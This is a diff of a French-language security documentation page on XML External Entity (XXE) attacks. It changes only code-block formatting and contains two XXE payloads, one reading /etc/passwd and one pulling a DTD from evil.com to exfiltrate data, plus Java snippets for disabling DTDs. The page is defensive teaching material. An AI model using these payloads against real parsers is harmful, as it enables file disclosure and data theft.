@@ -7743,12 +7743,12 @@
 <ul>
 <li>Se produit lorsque l'application XML traite les entités externes sans validation ou protection adéquates.</li>
 </ul>
-<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE foo [
-&lt;!ELEMENT foo ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
-&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
-</code></pre>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="cp">&lt;!DOCTYPE foo [</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="cp">&lt;!ELEMENT foo ANY &gt;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span>]&gt;
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
+</span></code></pre></div>
 <ul>
 <li>Cette attaque récupère le contenu du fichier <code>/etc/passwd</code>.</li>
 </ul>
@@ -7756,14 +7756,14 @@
 <ul>
 <li>Se produit lorsque l'attaquant utilise l'entité externe pour initier une connexion sortante vers un serveur contrôlé par lui.</li>
 </ul>
-<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE foo [
-&lt;!ELEMENT foo ANY &gt;
-&lt;!ENTITY % xxe SYSTEM &quot;http://evil.com/xxe.dtd&quot;&gt;
-%xxe;
-]&gt;
-&lt;foo&gt;&amp;all;&lt;/foo&gt;
-</code></pre>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="cp">&lt;!DOCTYPE foo [</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="cp">&lt;!ELEMENT foo ANY &gt;</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="cp">&lt;!ENTITY % xxe SYSTEM &quot;http://evil.com/xxe.dtd&quot;&gt;</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>%xxe;
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>]&gt;
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;all;</span><span class="nt">&lt;/foo&gt;</span>
+</span></code></pre></div>
 <ul>
 <li>Cette attaque peut être utilisée pour exfiltrer des données vers un serveur contrôlé par l'attaquant.</li>
 </ul>
@@ -7795,15 +7795,15 @@
 </ul>
 <h3 id="exemples-de-prevention">Exemples de Prévention</h3>
 <p><strong>Désactivation des DTD dans Java :</strong></p>
-<pre><code class="language-java">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
-dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
-dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
-</code></pre>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">DocumentBuilderFactory</span><span class="w"> </span><span class="n">dbf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DocumentBuilderFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">dbf</span><span class="p">.</span><span class="na">setFeature</span><span class="p">(</span><span class="n">XMLConstants</span><span class="p">.</span><span class="na">FEATURE_SECURE_PROCESSING</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">dbf</span><span class="p">.</span><span class="na">setFeature</span><span class="p">(</span><span class="s">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
+</span></code></pre></div>
 <p><strong>Utilisation de SAXParser avec les Entités Externes Désactivées :</strong></p>
-<pre><code class="language-java">SAXParserFactory factory = SAXParserFactory.newInstance();
-factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
-SAXParser parser = factory.newSAXParser();
-</code></pre>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">SAXParserFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SAXParserFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">factory</span><span class="p">.</span><span class="na">setFeature</span><span class="p">(</span><span class="s">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">SAXParser</span><span class="w"> </span><span class="n">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newSAXParser</span><span class="p">();</span>
+</span></code></pre></div>
 <hr />
 <table>
 <thead>
@@ -7889,7 +7889,7 @@ SAXParser parser = factory.newSAXParser();
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
